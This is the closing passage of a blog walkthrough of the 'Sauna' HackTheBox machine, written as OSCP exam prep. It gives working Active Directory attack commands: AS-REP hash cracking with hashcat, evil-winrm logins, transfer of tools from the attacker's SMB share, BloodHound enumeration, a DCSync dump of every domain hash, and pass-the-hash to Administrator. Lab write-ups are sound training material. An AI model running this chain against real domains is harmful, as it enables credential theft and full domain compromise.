+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">18200</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --force<br><br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:<span class="hljs-number">6917</span>e50f638536dc4a8acec7903dc045<span class="hljs-variable">$2b03faaa6ed126e97cbc936ab835e16b6a2c185bded1e4f679985c6adcb993ad7b843a05e6fe0ccaa35a9f8d196d161d3b0335a6eaf21e1c4d943d4ad0fba1dcc07283c3172b6eb2ca0f2123f0efb81a517b1a8ca2b6973fd073dff3b67a02961060f232c99e1985aeb80c6d0c7a803cf84c6c8122610c3297f1decc329601aaeec33c92a25c32574d1537e11c09fbdc2c1169d381bdf2864f3a6ff27b457d41df8c0b1b010d5a1b5a2bbf1bd08f3a0259aa5a79ca27a408bf40497c37ecd733425d907c0ad4fc87fbdef0c417718adfe0377123821694223dc850bb23e67edc9afd8254822d24b8f0220c20dd7d0f327937439a1b9284a596c15d49fd9adc97</span>:Thestrokes23<br></code></pre></td></tr></table></figure>
+
+<h3 id="Evil-winrm"><a href="#Evil-winrm" class="headerlink" title="Evil-winrm"></a>Evil-winrm</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span> -u fsmith -<span class="hljs-selector-tag">p</span> Thestrokes23<br></code></pre></td></tr></table></figure>
+
+<p>And user.txt is in C:\Users\FSmith\desktop</p>
+<img src="/2023/05/07/Road-to-OSCP-6-Sauna/user.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="Priv-fsmith-–-gt-svc-loanmgr"><a href="#Priv-fsmith-–-gt-svc-loanmgr" class="headerlink" title="Priv: fsmith –&gt; svc_loanmgr"></a>Priv: fsmith –&gt; svc_loanmgr</h2><p>using smbserver.py to transfer tools like <code>winpeas.exe</code> to get information.</p>
+<p>on attack host:</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">impacket</span>-smbserver share . -smb2sup<span class="hljs-keyword">port</span><br></code></pre></td></tr></table></figure>
+
+<p>on victim host:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>10.10.16.2<span class="hljs-symbol">\\</span>share\winpeas.exe<br></code></pre></td></tr></table></figure>
+
+<p>then we get a information like this</p>
+<img src="/2023/05/07/Road-to-OSCP-6-Sauna/svc_loadnmanager.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>Evil<span class="hljs-operator">-</span>WinRM<span class="hljs-operator">*</span> PS C:\<span class="hljs-operator">&gt;</span> net <span class="hljs-keyword">user</span><br><br><span class="hljs-keyword">User</span> accounts <span class="hljs-keyword">for</span> \\                                  <br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>Administrator            FSmith                   Guest<br>HSmith                   krbtgt                   svc_loanmgr<br>The command completed <span class="hljs-keyword">with</span> <span class="hljs-keyword">one</span> <span class="hljs-keyword">or</span> more errors.<br></code></pre></td></tr></table></figure>
+
+<p>evil-winrm to svc-loanmgr</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span> -u svc_loanmgr -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;Moneymakestheworldgoround!&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Priv-svc-loanmgr-–-gt-root"><a href="#Priv-svc-loanmgr-–-gt-root" class="headerlink" title="Priv: svc_loanmgr –&gt; root"></a>Priv: svc_loanmgr –&gt; root</h2><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bloodhound.py -c <span class="hljs-keyword">all</span> -u svc_loanmgr -p <span class="hljs-string">&#x27;Moneymakestheworldgoround!&#x27;</span> -ns <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> -d EGOTISTICAL-BANK.<span class="hljs-keyword">LOCAL</span> <span class="hljs-comment">--zip</span><br></code></pre></td></tr></table></figure>
+
+<p>then load zip-file to bloodhound</p>
+<h3 id="Analyze-result"><a href="#Analyze-result" class="headerlink" title="Analyze result"></a>Analyze result</h3><img src="/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507220204297.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507220209450.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Through Bloodhound,we find that svc_loanmgr has dsync priviliege to domain.so just using <code>secretdump.py</code>.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">impacket</span>-secretdump &#x27;svc_loanmgr:Moneymakestheworldgoround!@<span class="hljs-number">10.10.10.175</span>&#x27;<br><br><br><span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">823452073</span>d75b9d1cf70ebdf86c7f98e:::<br><span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-attribute">krbtgt</span>:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">4</span>a8899428cad97676ff802229e466e2c:::<br><span class="hljs-attribute">EGOTISTICAL</span>-BANK.LOCAL\HSmith:<span class="hljs-number">1103</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">58</span>a52d36c84fb7f5f1beab9a201db1dd:::<br><span class="hljs-attribute">EGOTISTICAL</span>-BANK.LOCAL\FSmith:<span class="hljs-number">1105</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">58</span>a52d36c84fb7f5f1beab9a201db1dd:::<br><span class="hljs-attribute">EGOTISTICAL</span>-BANK.LOCAL\svc_loanmgr:<span class="hljs-number">1108</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">9</span>cb31797c39a9b170b04058ba2bba48c:::<br><span class="hljs-attribute">SAUNA</span>$:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">49</span>f07e880c2babbb9f51fd264c51f979:::<br><span class="hljs-section">&lt;SNIP&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>evil-winrm</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">evil</span>-winrm -i <span class="hljs-number">10.10.10.175</span> -u Administator -H <span class="hljs-number">823452073</span>d75b9d1cf70ebdf86c7f98e<br></code></pre></td></tr></table></figure>
+
+<p>wmiexec</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">impacket-wmiexec -hashes &#x27;aad3b435b<span class="hljs-number">5140</span>4eeaad3b435b<span class="hljs-number">5140</span>4ee:<span class="hljs-number">82345207</span>3d75b9d1cf70ebdf86c7f98e&#x27; -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span> administrator@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span><br></code></pre></td></tr></table></figure>
+
+<p>or using other ways.</p>
+<p>Finally get root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\<span class="hljs-built_in">users</span>\administrator\desktop&gt;<span class="hljs-built_in">type</span> root.txt<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Road-to-OSCP-6-Sauna</div>
+      <div>http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/09/Road-to-OSCP-7-Blackfield/" title="Road-to-OSCP-7-Blackfield">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Road-to-OSCP-7-Blackfield</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/13/Road-to-OSCP-5-DC09/" title="Road-to-OSCP-5-DC09">
+                        <span class="hidden-mobile">Road-to-OSCP-5-DC09</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
